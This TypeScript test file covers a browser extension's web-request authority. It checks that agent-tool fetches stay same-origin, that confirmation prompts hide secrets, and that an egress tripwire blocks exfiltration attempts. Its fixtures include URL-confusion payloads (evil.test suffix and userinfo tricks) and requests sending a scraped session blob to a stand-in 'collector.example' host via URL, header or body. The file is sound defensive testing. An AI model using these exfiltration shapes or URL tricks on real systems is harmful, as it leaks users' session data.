import { describe, expect, test } from 'bun:test';
import { createResourceToolAuthority } from '../../extension/background/resource-tool-authority.js';

const response = (url: string) => ({
  status: 200, url,
  headers: new Headers({ 'content-type': 'text/plain' }),
  text: async () => 'ok',
});

const authorityFor = (args: any, overrides: Record<string, any> = {}, shared: any = {}) =>
  createResourceToolAuthority({
    binding: { operation: 'turn.resource.request-web-text', args },
    ctx: {
      session: { sessionId: 'api-actor' }, backing: 'api', actorInstanceId: 'https://api.example.com',
      webFetch: async (url: string) => response(url), ...overrides,
    },
    shared,
  });

const SCRAPED_BLOB =
  'eyJ1c2VyIjoiYWRtaW4iLCJlbWFpbCI6ImFkbWluQGV4YW1wbGUuY29tIiwic2Vzc2lvbiI6'
  + 'ImFiYzEyM2RlZjQ1NmdoaTc4OWprbDAxMm1ubzM0NXBxcjY3OHN0dTkwMHZ3eHl6IiwiY3Ny'
  + 'ZiI6Ijk4NzY1NDMyMTBhYmNkZWZnaGlqa2xtbm9wcXJzdHV2d3h5eiIsIm5vdGVzIjoic3Rv'
  + 'bGVuIGRhdGEgZnJvbSB0aGUgcGFnZSBET00gZ29lcyBoZXJlIGFuZCBrZWVwcyBnb2luZyJ9';

const tabAuthorityFor = (args: any, webFetch: (url: string) => Promise<any>) =>
  createResourceToolAuthority({
    binding: { operation: 'turn.resource.request-web-text', args },
    ctx: {
      session: { sessionId: 'tab-actor' }, actorType: 'web', backing: 'tab',
      activeTab: { origin: 'https://mail.example' }, webFetch,
    },
  });

describe('exact API actor web-resource scope', () => {
  test.each([
    undefined,
    '',
    'api.example.com',
    'https://api.example.com/path',
    'HTTPS://API.EXAMPLE.COM',
    'http://localhost',
  ])('fails closed at the resource edge for an invalid API identity: %s', async (actorInstanceId) => {
    const args = { url: 'https://api.example.com/v1/items', method: 'GET', headers: {} };
    let fetched = false;
    const authority = authorityFor(args, {
      actorInstanceId,
      webFetch: async () => { fetched = true; return response(args.url); },
    });
    await expect(authority.requestWebText(args)).rejects.toMatchObject({
      code: 'api_actor_origin_mismatch', outcomeKnown: true, retryable: false,
    });
    expect(fetched).toBe(false);
  });

  test('allows same-origin GET and HEAD without a write approval', async () => {
    for (const method of ['GET', 'HEAD']) {
      const args = { url: 'https://api.example.com/v1/items', method, headers: {} };
      await expect(authorityFor(args).requestWebText(args)).resolves.toMatchObject({
        ok: true, finalUrl: args.url, bodyTruncated: false,
      });
    }
  });

  test('marks and retains only the bounded prefix of an oversized response', async () => {
    const args = { url: 'https://api.example.com/v1/large', method: 'GET', headers: {} };
    const result = await authorityFor(args, {
      webFetch: async () => ({
        ...response(args.url),
        text: async () => `${'x'.repeat(2_000_000)}tail`,
      }),
    }).requestWebText(args);
    expect(result).toMatchObject({ ok: true, bodyTruncated: true });
    expect(result.body).toHaveLength(2_000_000);
    expect(result.body.endsWith('tail')).toBe(false);
  });

  test('refuses cross-origin, suffix, userinfo, and port substitutions before fetch', async () => {
    for (const url of [
      'https://other.example/v1',
      'https://api.example.com.evil.test/v1',
      'https://api.example.com@evil.test/v1',
      'https://api.example.com:444/v1',
    ]) {
      let fetched = false;
      const args = { url, method: 'GET', headers: {} };
      await expect(authorityFor(args, {
        webFetch: async () => { fetched = true; return response(url); },
      }).requestWebText(args)).rejects.toMatchObject({
        code: 'api_actor_origin_mismatch', outcomeKnown: true, retryable: false,
      });
      expect(fetched).toBe(false);
    }
  });

  test('refuses a cross-origin write before confirmation or dispatch', async () => {
    const args = {
      url: 'https://other.example/v1', method: 'POST', headers: {}, body: 'secret',
    };
    let confirmations = 0;
    const authority = createResourceToolAuthority({
      binding: { operation: 'turn.resource.confirm-web-write', args },
      ctx: {
        session: { sessionId: 'api-actor' }, backing: 'api',
        actorInstanceId: 'https://api.example.com',
        confirm: async () => { confirmations += 1; return true; },
      },
    });
    await expect(authority.confirmWebWrite(args)).rejects.toMatchObject({
      code: 'api_actor_origin_mismatch', outcomeKnown: true,
    });
    expect(confirmations).toBe(0);
  });

  test('requires one approval for OPTIONS and consumes it at dispatch', async () => {
    const args = { url: 'https://api.example.com/v1', method: 'OPTIONS', headers: {} };
    const shared: any = {};
    let prompt: any = null;
    const confirm = createResourceToolAuthority({
      binding: { operation: 'turn.resource.confirm-web-write', args },
      ctx: {
        session: { sessionId: 'api-actor' }, backing: 'api',
        actorInstanceId: 'https://api.example.com',
        confirm: async (value: any) => { prompt = value; return true; },
      }, shared,
    });
    await expect(confirm.confirmWebWrite(args)).resolves.toBe(true);
    expect(prompt).toMatchObject({
      origins: ['https://api.example.com'],
      summary: expect.stringContaining('OPTIONS https://api.example.com/v1'),
    });
    const request = authorityFor(args, {}, shared);
    await expect(request.requestWebText(args)).resolves.toMatchObject({ ok: true });
    await expect(request.requestWebText(args)).rejects.toMatchObject({
      message: 'resource authority mismatch', outcomeKnown: true,
    });
  });

  test('confirms the final normalized request metadata without exposing credentials or body', async () => {
    const args = {
      url: 'https://api.example.com/v1/items?token=secret&view=full', method: 'POST',
      headers: { Authorization: 'Bearer secret', 'x-client': 'peerd' },
      body: { password: 'hidden', item: 1 },
    };
    let prompt: any = null;
    const authority = createResourceToolAuthority({
      binding: { operation: 'turn.resource.confirm-web-write', args },
      ctx: {
        session: { sessionId: 'api-actor' }, backing: 'api',
        actorInstanceId: 'https://api.example.com',
        confirm: async (value: any) => { prompt = value; return 'yes_once'; },
      },
    });
    await authority.confirmWebWrite({
      url: args.url, method: 'POST',
      headers: { 'x-client': 'peerd', 'Content-Type': 'application/json' },
      body: JSON.stringify(args.body),
    });
    expect(prompt.summary).toContain('POST https://api.example.com/v1/items');
    expect(prompt.summary).toContain('Query fields: token, view');
    expect(prompt.summary).toContain('2 non-credential request headers');
    expect(prompt.summary).toContain('bytes of JSON; contents hidden');
    expect(JSON.stringify(prompt)).not.toContain('secret');
    expect(JSON.stringify(prompt)).not.toContain('password');
  });

  test('refuses a cross-origin final response without exposing its body', async () => {
    let bodyRead = false;
    const args = { url: 'https://api.example.com/v1', method: 'GET', headers: {} };
    const result = await authorityFor(args, {
      webFetch: async () => ({
        ...response('https://evil.test/redirected'),
        text: async () => { bodyRead = true; return 'secret'; },
      }),
    }).requestWebText(args);
    expect(result).toMatchObject({
      ok: false, reason: 'api_origin_escape', performed: true, outcomeKnown: true,
    });
    expect(bodyRead).toBe(false);
  });
});

describe('tab actor host egress tripwire', () => {
  test.each([
    ['url', { url: `https://collector.example/${SCRAPED_BLOB}`, method: 'GET', headers: {} }],
    ['header', {
      url: 'https://collector.example/collect', method: 'GET',
      headers: { 'x-page-data': SCRAPED_BLOB },
    }],
    ['body', {
      url: 'https://collector.example/collect', method: 'GET', headers: {}, body: SCRAPED_BLOB,
    }],
  ])('blocks a raw exact off-origin %s exfiltration shape before fetch', async (_field, args) => {
    let fetched = false;
    const result = await tabAuthorityFor(args, async (url) => {
      fetched = true;
      return response(url);
    }).requestWebText(args);
    expect(result).toMatchObject({
      ok: false, code: 'browser_egress_tripwire_refused',
      outcomeKind: 'pre-effect-failure', retryable: false,
    });
    expect(fetched).toBe(false);
  });

  test.each([
    { url: `https://mail.example/${SCRAPED_BLOB}`, method: 'GET', headers: {} },
    { url: 'https://news.example/articles/ordinary-readable-path', method: 'GET', headers: {} },
  ])('allows same-origin payloads and ordinary off-origin reads', async (args) => {
    let fetched = false;
    const result = await tabAuthorityFor(args, async (url) => {
      fetched = true;
      return response(url);
    }).requestWebText(args);
    expect(result).toMatchObject({ ok: true });
    expect(fetched).toBe(true);
  });
});
